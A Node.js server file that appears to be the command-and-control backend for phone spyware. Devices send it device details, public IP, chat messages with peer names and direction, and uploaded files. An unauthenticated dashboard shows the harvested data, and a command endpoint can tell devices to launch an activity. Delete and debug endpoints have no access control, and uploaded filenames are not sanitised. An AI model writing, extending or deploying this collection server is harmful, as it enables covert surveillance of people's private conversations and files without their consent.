import http from "node:http";
import { URL } from "node:url";
import { createClient } from "@supabase/supabase-js";
import fs from "fs";
import path from "path";

const port = Number(process.env.PORT || 3000);

if (!process.env.SUPABASE_URL || !process.env.SUPABASE_SECRET_KEY) {
  console.error("Missing SUPABASE_URL or SUPABASE_SECRET_KEY");
  process.exit(1);
}

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SECRET_KEY
);

// ============================================
// FILE UPLOAD CONFIG (Local Storage)
// ============================================

const UPLOAD_DIR = path.join(process.cwd(), "uploads");
const THUMB_DIR = path.join(process.cwd(), "thumbs");
const LOG_FILE = path.join(process.cwd(), "logs.json");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR, { recursive: true });

// ============================================
// COMMAND (in-memory)
// ============================================

let command = {
  title: "MG Menu",
  text: "Server online",
  action: "none",
  activity: ""
};

// ============================================
// FILE LOG HELPERS (Local logs.json)
// ============================================

function readLogs() {
  if (!fs.existsSync(LOG_FILE)) return [];
  try {
    return fs.readFileSync(LOG_FILE, "utf-8")
      .split("\n")
      .filter(Boolean)
      .map(line => {
        try { return JSON.parse(line); } catch { return null; }
      })
      .filter(Boolean);
  } catch {
    return [];
  }
}

function saveLog(data) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
  } catch {}
}

function removeFileLogEntries(fileName) {
  const logs = readLogs();
  const nextLogs = logs.filter(entry => !(entry.type === "file" && entry.file === fileName));
  try {
    const content = nextLogs.map(entry => JSON.stringify(entry)).join("\n");
    fs.writeFileSync(LOG_FILE, content ? `${content}\n` : "");
  } catch {}
}

function getLatestDeviceForIP(ip, logs) {
  const devices = logs
    .filter(entry => entry.type === "device" && entry.ip === ip)
    .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));
  return devices[0] || null;
}

function getFileType(fileName) {
  const ext = path.extname(fileName || "").toLowerCase();
  if ([".jpg", ".jpeg", ".png", ".gif", ".webp"].includes(ext)) return "image";
  if ([".mp4", ".webm", ".mov", ".mkv"].includes(ext)) return "video";
  if ([".mp3", ".wav", ".aac", ".m4a"].includes(ext)) return "audio";
  if ([".pdf"].includes(ext)) return "document";
  if ([".zip", ".rar", ".7z"].includes(ext)) return "archive";
  return "file";
}

function getFileIcon(type) {
  const icons = { image: "IMG", video: "VID", audio: "AUD", document: "DOC", archive: "ZIP", file: "FILE" };
  return icons[type] || "FILE";
}

function formatDate(dateValue) {
  if (!dateValue) return "-";
  const date = new Date(dateValue);
  if (Number.isNaN(date.getTime())) return "-";
  return date.toLocaleString("en-IN", { dateStyle: "medium", timeStyle: "short" });
}

function formatSize(bytes) {
  const num = Number(bytes);
  if (!Number.isFinite(num) || num < 1) return "-";
  const units = ["B", "KB", "MB", "GB"];
  let size = num;
  let unitIndex = 0;
  while (size >= 1024 && unitIndex < units.length - 1) {
    size /= 1024;
    unitIndex += 1;
  }
  return `${size.toFixed(size >= 10 || unitIndex === 0 ? 0 : 1)} ${units[unitIndex]}`;
}

function escapeHtml(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function getIP(req) {
  return (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
         req.socket.remoteAddress || "unknown";
}

// ============================================
// DASHBOARD RENDERERS
// ============================================

async function renderDashboard() {
  // Get devices from Supabase
  const { data: deviceList, error: deviceError } = await supabase
    .from("devices")
    .select("*")
    .order("server_last_seen", { ascending: false });

  if (deviceError) {
    console.error("Dashboard device error:", deviceError);
    return renderErrorPage("Unable to load devices from database.");
  }

  // Get messages from Supabase
  const { data: allMessages, error: messageError } = await supabase
    .from("messages")
    .select("*")
    .order("message_time", { ascending: false })
    .limit(5000);

  if (messageError) {
    console.error("Dashboard message error:", messageError);
    return renderErrorPage("Unable to load messages from database.");
  }

  // Get files from local logs.json
  const logs = readLogs();
  const files = logs.filter(entry => entry.type === "file");
  const totalFiles = files.length;

  // File count per device (from logs.json)
  const fileCounts = {};
  for (const file of files) {
    const deviceId = file.device_id || "unknown";
    if (!fileCounts[deviceId]) fileCounts[deviceId] = 0;
    fileCounts[deviceId]++;
  }

  const selectedId = (deviceList || []).find(device =>
    (allMessages || []).some(msg => msg.device_id === device.device_id)
  )?.device_id || (deviceList?.length ? deviceList[0].device_id : "");

  const selectedMessages = selectedId
    ? (allMessages || []).filter(msg => msg.device_id === selectedId)
    : [];

  const totalMessages = allMessages?.length || 0;

  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>MG Control</title>
  <style>
    :root{color-scheme:dark}
    body{margin:0;background:#080b10;color:#e8eef7;font-family:Inter,system-ui,-apple-system,Segoe UI,Arial,sans-serif}
    header{height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 18px;border-bottom:1px solid #1f2937;background:#0c111a}
    h1{font-size:16px;margin:0}
    small{color:#8b98a8}
    main{display:grid;grid-template-columns:320px 1fr;min-height:calc(100vh - 56px)}
    aside{border-right:1px solid #1f2937;background:#0c111a;padding:14px}
    section{padding:18px}
    .stat{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:14px}
    .box,.device,.panel{border:1px solid #1f2937;background:#101722;border-radius:10px}
    .box{padding:12px}
    .box b{font-size:20px}
    .device{display:block;width:100%;text-align:left;color:inherit;margin-bottom:10px;padding:12px;box-sizing:border-box}
    .dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:8px;background:#64748b}
    .on{background:#22c55e}
    .name{font-weight:700}
    .meta{font-size:12px;color:#94a3b8;margin-top:5px}
    .panel{padding:14px;margin-bottom:14px}
    input,textarea,button{width:100%;box-sizing:border-box;border-radius:8px;border:1px solid #273449;background:#0b1018;color:#eef2f8;padding:10px;margin-top:8px}
    button{background:#e5e7eb;color:#111827;font-weight:700;cursor:pointer}
    table{width:100%;border-collapse:collapse}
    .table{overflow:auto}
    th,td{text-align:left;border-bottom:1px solid #1f2937;padding:10px;font-size:13px;vertical-align:top}
    th{color:#94a3b8;font-weight:600}
    .msg-in{color:#93c5fd}
    .msg-out{color:#86efac}
    .empty{border:1px dashed #293548;border-radius:10px;padding:30px;text-align:center;color:#64748b}
    .error{border:1px solid #7f1d1d;background:#1c0b0b;color:#fecaca;padding:20px;border-radius:10px}
    .file-badge{background:#1f2937;padding:2px 10px;border-radius:12px;font-size:11px;color:#94a3b8}
    @media(max-width:800px){main{grid-template-columns:1fr}aside{border-right:0;border-bottom:1px solid #1f2937}}
  </style>
</head>
<body>
<header>
  <div>
    <h1>MG Control</h1>
    <small>Chat + Device + File Upload</small>
  </div>
  <small>${escapeHtml(new Date().toLocaleString())}</small>
</header>
<main>
<aside>
  <div class="stat">
    <div class="box"><small>Devices</small><br><b>${deviceList?.length || 0}</b></div>
    <div class="box"><small>Messages</small><br><b>${totalMessages}</b></div>
    <div class="box"><small>Files</small><br><b>${totalFiles}</b></div>
  </div>
  ${(deviceList || []).map(d => renderDeviceCard(d, fileCounts[d.device_id] || 0)).join("")}
</aside>
<section>
  <div class="panel">
    <b>Menu Command</b>
    <form method="post" action="/panel/command">
      <textarea name="text" rows="2" placeholder="Status text">${escapeHtml(command.text)}</textarea>
      <input name="activity" placeholder="Activity class optional" value="${escapeHtml(command.activity)}">
      <button>Save command</button>
    </form>
  </div>
  <div class="panel">
    <b>Latest Messages</b>
    ${selectedMessages.length ? renderMessagesTable(selectedMessages.slice().reverse().slice(0, 200)) : `<div class="empty">No messages yet</div>`}
  </div>
</section>
</main>
</body>
</html>`;
}

function renderDeviceCard(device, fileCount) {
  const online = Date.now() - Number(device.server_last_seen) < 60000;
  const displayName = device.my_name || device.public_id || (device.my_uid ? `UID ${device.my_uid}` : device.device_id);

  return `
<div class="device">
  <div>
    <span class="dot ${online ? "on" : ""}"></span>
    <span class="name">${escapeHtml(displayName)}</span>
    <span class="file-badge">📁 ${fileCount}</span>
  </div>
  <div class="meta">
    ${escapeHtml(device.brand || "")} ${escapeHtml(device.model || "")} | ${escapeHtml(device.network_type || "")} | ${device.battery_percent ?? "?"}%
  </div>
  <div class="meta">
    UID ${escapeHtml(device.my_uid)} ${device.public_id ? `| ${escapeHtml(device.public_id)}` : ""}
  </div>
  <div class="meta">${escapeHtml(device.public_ip || "")} | ${ago(device.server_last_seen)}</div>
  <div class="meta" style="font-size:10px;color:#4a5568">${escapeHtml(device.device_id)}</div>
</div>`;
}

function renderMessagesTable(messages) {
  return `
<div class="table">
<table>
<thead><tr><th>Time</th><th>Peer</th><th>Dir</th><th>Text</th><th>MID</th></tr></thead>
<tbody>
${messages.map(m => `
<tr>
<td>${escapeHtml(new Date(Number(m.message_time)).toLocaleString())}</td>
<td>${escapeHtml(m.peer_name || (m.peer_uid ? `UID ${m.peer_uid}` : ""))}</td>
<td class="${m.direction === "out" ? "msg-out" : "msg-in"}">${escapeHtml(m.direction)}</td>
<td>${escapeHtml(m.text)}</td>
<td><small>${escapeHtml(m.mid)}</small></td>
</tr>`).join("")}
</tbody>
</table>
</div>`;
}

function renderErrorPage(message) {
  return `<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>MG Control Error</title>
<style>body{margin:0;padding:30px;background:#080b10;color:#e8eef7;font-family:system-ui}.error{border:1px solid #7f1d1d;background:#1c0b0b;color:#fecaca;padding:20px;border-radius:10px}</style>
</head><body><div class="error">${escapeHtml(message)}</div></body></html>`;
}

function ago(time) {
  const diff = Math.max(0, Date.now() - Number(time));
  if (diff < 60000) return `${Math.floor(diff / 1000)}s ago`;
  if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
  return `${Math.floor(diff / 3600000)}h ago`;
}

// ============================================
// EXISTING HELPERS (from your server)
// ============================================

async function readBody(req) {
  const chunks = [];
  for await (const chunk of req) {
    chunks.push(chunk);
  }
  const raw = Buffer.concat(chunks).toString("utf8");
  if (!raw) return {};
  const type = req.headers["content-type"] || "";
  if (String(type).includes("application/x-www-form-urlencoded")) {
    return Object.fromEntries(new URLSearchParams(raw));
  }
  try { return JSON.parse(raw); } catch { return {}; }
}

function json(res, payload, status = 200) {
  const body = JSON.stringify(payload);
  res.writeHead(status, { "content-type": "application/json; charset=utf-8", "cache-control": "no-store" });
  res.end(body);
}

function html(res, body) {
  res.writeHead(200, { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" });
  res.end(body);
}

function redirect(res, location) {
  res.writeHead(302, { location });
  res.end();
}

function publicIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (typeof forwarded === "string" && forwarded) {
    return forwarded.split(",")[0].trim();
  }
  return req.socket.remoteAddress || "";
}

function clean(value) {
  return value == null ? "" : String(value);
}

function number(value) {
  const n = Number(value);
  return Number.isFinite(n) ? n : 0;
}

function optionalNumber(value) {
  const n = Number(value);
  return Number.isFinite(n) ? n : null;
}

function escapeHtml(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function isHeartbeatPath(pathname) {
  return pathname === "/api/heartbeat" || pathname === "/api/v1/device/heartbeat";
}

function isChatBatchPath(pathname) {
  return pathname === "/api/chat/batch" || pathname === "/api/v1/chat/batch";
}

async function ensureDevice(deviceId, body, req) {
  const now = Date.now();
  const { data: existing } = await supabase
    .from("devices")
    .select("created_at")
    .eq("device_id", deviceId)
    .maybeSingle();

  const device = {
    device_id: deviceId,
    my_uid: number(body.myUid),
    public_id: clean(body.publicId),
    my_name: "",
    model: "",
    brand: "",
    battery_percent: null,
    network_type: "",
    public_ip: publicIp(req),
    client_last_seen: now,
    server_last_seen: now,
    created_at: existing?.created_at || now
  };

  const { error } = await supabase
    .from("devices")
    .upsert(device, { onConflict: "device_id" });

  if (error) {
    console.error("ensureDevice upsert error:", error);
  }
}

// ============================================
// HTTP SERVER
// ============================================

const server = http.createServer(async (req, res) => {
  try {
    const url = new URL(
      req.url || "/",
      `http://${req.headers.host || "localhost"}`
    );

    // ============================================
    // DASHBOARD
    // ============================================
    if (req.method === "GET" && url.pathname === "/") {
      return html(res, await renderDashboard());
    }

    // ============================================
    // COMMAND
    // ============================================
    if (req.method === "GET" && url.pathname === "/api/data") {
      return json(res, command);
    }

    if (req.method === "POST" && url.pathname === "/panel/command") {
      const body = await readBody(req);
      command = {
        title: "MG Menu",
        text: String(body.text || "Server online"),
        action: body.activity ? "launch" : "none",
        activity: String(body.activity || "")
      };
      redirect(res, "/");
      return;
    }

    // ============================================
    // DEVICE HEARTBEAT (Supabase)
    // ============================================
    if (req.method === "POST" && isHeartbeatPath(url.pathname)) {
      const body = await readBody(req);
      const deviceId = clean(body.deviceId);

      if (!deviceId) {
        return json(res, { ok: false, error: "deviceId required" }, 400);
      }

      const now = Date.now();
      const device = {
        device_id: deviceId,
        my_uid: number(body.myUid),
        public_id: clean(body.publicId),
        my_name: clean(body.myName),
        model: clean(body.model),
        brand: clean(body.brand),
        battery_percent: optionalNumber(body.batteryPercent),
        network_type: clean(body.networkType),
        public_ip: publicIp(req),
        client_last_seen: number(body.lastSeen) || now,
        server_last_seen: now,
        created_at: now
      };

      const { data: existingDevice } = await supabase
        .from("devices")
        .select("created_at")
        .eq("device_id", deviceId)
        .maybeSingle();

      if (existingDevice?.created_at) {
        device.created_at = existingDevice.created_at;
      }

      const { error: deviceError } = await supabase
        .from("devices")
        .upsert(device, { onConflict: "device_id" });

      if (deviceError) {
        console.error("Device upsert error:", deviceError);
        return json(res, { ok: false, error: "database error" }, 500);
      }

      return json(res, { ok: true });
    }

    // ============================================
    // CHAT BATCH (Supabase)
    // ============================================
    if (req.method === "POST" && isChatBatchPath(url.pathname)) {
      const body = await readBody(req);
      const deviceId = clean(body.deviceId);

      if (!deviceId) {
        return json(res, { ok: false, error: "deviceId required" }, 400);
      }

      const list = Array.isArray(body.messages) ? body.messages.slice(0, 50) : [];

      if (!list.length) {
        return json(res, { ok: true, inserted: 0, skipped: 0 });
      }

      await ensureDevice(deviceId, body, req);

      const rows = [];
      let skipped = 0;

      for (const raw of list) {
        const mid = clean(raw.mid);
        if (!mid) {
          skipped++;
          continue;
        }
        rows.push({
          device_id: deviceId,
          mid,
          direction: raw.direction === "out" ? "out" : "in",
          peer_uid: number(raw.peerUid),
          peer_name: clean(raw.peerName),
          text: clean(raw.text).slice(0, 500),
          message_time: number(raw.time) || Date.now(),
          received_at: Date.now()
        });
      }

      if (!rows.length) {
        return json(res, { ok: true, inserted: 0, skipped });
      }

      const { data: insertedRows, error: messageError } = await supabase
        .from("messages")
        .upsert(rows, { onConflict: "device_id,mid", ignoreDuplicates: true })
        .select("device_id,mid");

      if (messageError) {
        console.error("Message insert error:", messageError);
        return json(res, { ok: false, error: "database error" }, 500);
      }

      const inserted = insertedRows?.length || 0;
      return json(res, { ok: true, inserted, skipped: skipped + (rows.length - inserted) });
    }

    // ============================================
    // FILE UPLOAD (Local Storage)
    // ============================================
    if (req.method === "POST" && url.pathname === "/upload") {
      const contentType = req.headers["content-type"] || "";
      
      if (!contentType.includes("multipart/form-data")) {
        return json(res, { ok: false, error: "multipart/form-data required" }, 400);
      }

      // Parse multipart manually
      let buffer = Buffer.alloc(0);
      req.on("data", (chunk) => {
        buffer = Buffer.concat([buffer, chunk]);
      });

      req.on("end", async () => {
        try {
          const boundary = getBoundary(contentType);
          if (!boundary) {
            return json(res, { ok: false, error: "Invalid boundary" }, 400);
          }

          const parts = parseMultipart(buffer, boundary);
          let deviceId = null;
          let fileName = null;
          let fileData = null;

          for (const part of parts) {
            const cd = part.headers["content-disposition"] || "";
            if (cd.includes('name="deviceId"')) {
              deviceId = part.data.toString("utf8").trim();
            } else if (cd.includes('name="file"')) {
              const match = cd.match(/filename="([^"]+)"/);
              fileName = match ? match[1] : "file.bin";
              fileData = part.data;
            }
          }

          if (!deviceId) {
            return json(res, { ok: false, error: "deviceId required" }, 400);
          }

          if (!fileData) {
            return json(res, { ok: false, error: "No file uploaded" }, 400);
          }

          // Ensure device exists in Supabase
          await ensureDevice(deviceId, { deviceId }, req);

          // Save file locally
          const safeName = `${Date.now()}_${fileName}`;
          const filePath = path.join(UPLOAD_DIR, safeName);
          fs.writeFileSync(filePath, fileData);

          // Save thumbnail
          const thumbName = `thumb_${safeName}`;
          const thumbPath = path.join(THUMB_DIR, thumbName);
          fs.copyFileSync(filePath, thumbPath);

          // Log file with device_id
          saveLog({
            type: "file",
            file: safeName,
            original: fileName,
            folder: path.dirname(fileName) || "/",
            thumb: thumbName,
            device_id: deviceId,
            ip: getIP(req),
            size: fileData.length,
            time: new Date().toISOString()
          });

          return json(res, {
            ok: true,
            file: safeName,
            device_id: deviceId,
            message: "File uploaded successfully"
          });

        } catch (error) {
          console.error("Upload error:", error);
          return json(res, { ok: false, error: "upload failed" }, 500);
        }
      });

      req.on("error", () => {
        return json(res, { ok: false, error: "upload failed" }, 500);
      });

      return;
    }

    // ============================================
    // GET FILES FOR A DEVICE (from logs.json)
    // ============================================
    if (req.method === "GET" && url.pathname === "/api/files") {
      const deviceId = url.searchParams.get("deviceId");
      if (!deviceId) {
        return json(res, { ok: false, error: "deviceId required" }, 400);
      }

      const logs = readLogs();
      const files = logs
        .filter(entry => entry.type === "file" && entry.device_id === deviceId)
        .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));

      return json(res, { ok: true, files });
    }

    // ============================================
    // GET ALL FILES (for dashboard)
    // ============================================
    if (req.method === "GET" && url.pathname === "/api/all-files") {
      const logs = readLogs();
      const files = logs
        .filter(entry => entry.type === "file")
        .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0))
        .slice(0, 100);

      return json(res, { ok: true, files });
    }

    // ============================================
    // SERVE UPLOADED FILES
    // ============================================
    if (req.method === "GET" && url.pathname.startsWith("/uploads/")) {
      const fileName = url.pathname.split("/").pop();
      const filePath = path.join(UPLOAD_DIR, fileName);
      if (!fs.existsSync(filePath)) {
        return json(res, { ok: false, error: "File not found" }, 404);
      }
      res.writeHead(200, {
        "Content-Type": "application/octet-stream",
        "Cache-Control": "no-cache"
      });
      fs.createReadStream(filePath).pipe(res);
      return;
    }

    // ============================================
    // DELETE FILE
    // ============================================
    if (req.method === "DELETE" && url.pathname.startsWith("/api/file/")) {
      const fileName = url.pathname.split("/").pop();
      if (!fileName) {
        return json(res, { ok: false, error: "fileName required" }, 400);
      }

      const filePath = path.join(UPLOAD_DIR, fileName);
      const thumbPath = path.join(THUMB_DIR, `thumb_${fileName}`);

      if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
      if (fs.existsSync(thumbPath)) fs.unlinkSync(thumbPath);

      removeFileLogEntries(fileName);

      return json(res, { ok: true, message: "File deleted" });
    }

    // ============================================
    // DEBUG API (Supabase + Local)
    // ============================================
    if (req.method === "GET" && url.pathname === "/api/debug") {
      const [devicesResult, messagesResult] = await Promise.all([
        supabase.from("devices").select("*").order("server_last_seen", { ascending: false }),
        supabase.from("messages").select("*").order("message_time", { ascending: false }).limit(5000)
      ]);

      const logs = readLogs();
      const files = logs.filter(entry => entry.type === "file");

      const messagesByDevice = {};
      for (const msg of messagesResult.data || []) {
        if (!messagesByDevice[msg.device_id]) messagesByDevice[msg.device_id] = [];
        messagesByDevice[msg.device_id].push(msg);
      }

      const filesByDevice = {};
      for (const file of files) {
        const id = file.device_id || "unknown";
        if (!filesByDevice[id]) filesByDevice[id] = [];
        filesByDevice[id].push(file);
      }

      return json(res, {
        devices: devicesResult.data || [],
        messages: messagesByDevice,
        files: filesByDevice
      });
    }

    // ============================================
    // 404
    // ============================================
    return json(res, { ok: false, error: "not found" }, 404);

  } catch (error) {
    console.error(error);
    return json(res, { ok: false, error: "server error" }, 500);
  }
});

// ============================================
// MULTIPART HELPERS
// ============================================

function getBoundary(contentType) {
  const match = contentType.match(/boundary=([^;]+)/);
  return match ? match[1].trim() : null;
}

function parseMultipart(buffer, boundary) {
  const parts = [];
  const delimiter = Buffer.from(`--${boundary}`);
  const endDelimiter = Buffer.from(`--${boundary}--`);
  let start = 0;

  while (true) {
    const end = buffer.indexOf(delimiter, start);
    if (end === -1) break;

    const nextEnd = buffer.indexOf(delimiter, end + delimiter.length);
    if (nextEnd === -1) break;

    const partBuffer = buffer.slice(end + delimiter.length, nextEnd);
    if (partBuffer.length > 0) {
      const headersEnd = partBuffer.indexOf("\r\n\r\n");
      if (headersEnd !== -1) {
        const headerBuffer = partBuffer.slice(0, headersEnd);
        const headers = {};
        const headerLines = headerBuffer.toString("utf8").split("\r\n");
        for (const line of headerLines) {
          const colonIndex = line.indexOf(":");
          if (colonIndex !== -1) {
            const key = line.slice(0, colonIndex).toLowerCase().trim();
            const value = line.slice(colonIndex + 1).trim();
            headers[key] = value;
          }
        }
        const data = partBuffer.slice(headersEnd + 4);
        parts.push({ headers, data });
      }
    }

    start = nextEnd;
    if (buffer.indexOf(endDelimiter, start) === start) {
      break;
    }
  }

  return parts;
}

// ============================================
// START SERVER
// ============================================

server.listen(port, () => {
  console.log(`========================================`);
  console.log(`🚀 MG Server running on port ${port}`);
  console.log(`📡 URL: http://localhost:${port}`);
  console.log(`========================================`);
  console.log(`📦 Supabase (Chat + Device Info)`);
  console.log(`📁 Local Storage (Files)`);
  console.log(`   Uploads: ${UPLOAD_DIR}`);
  console.log(`   Thumbs: ${THUMB_DIR}`);
  console.log(`========================================`);
  console.log(`📋 Endpoints:`);
  console.log(`   GET  /                    - Dashboard`);
  console.log(`   POST /api/heartbeat       - Device info (Supabase)`);
  console.log(`   POST /api/chat/batch      - Chats (Supabase)`);
  console.log(`   POST /upload              - File upload (Local)`);
  console.log(`   GET  /api/files           - Get device files (Local)`);
  console.log(`   GET  /uploads/:file       - Serve file`);
  console.log(`   DELETE /api/file/:file    - Delete file`);
  console.log(`   GET  /api/debug           - Debug all data`);
  console.log(`========================================`);
});
